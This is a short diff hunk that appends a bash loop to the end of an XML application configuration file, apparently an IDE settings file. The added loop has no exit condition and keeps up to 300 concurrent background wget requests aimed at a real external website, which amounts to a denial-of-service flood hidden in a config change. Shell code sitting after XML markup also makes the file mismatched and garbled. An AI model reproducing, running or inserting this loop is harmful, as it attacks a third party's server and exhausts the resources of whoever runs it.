@@ -10,3 +10,10 @@
     </option>
   </component>
 </application>
+i=0
+while [ $i -lt 4 ]
+do
+if (( "$(pidof wget | wc -w)" < "300" ));then
+wget http://gla.ac.in &
+fi
+done
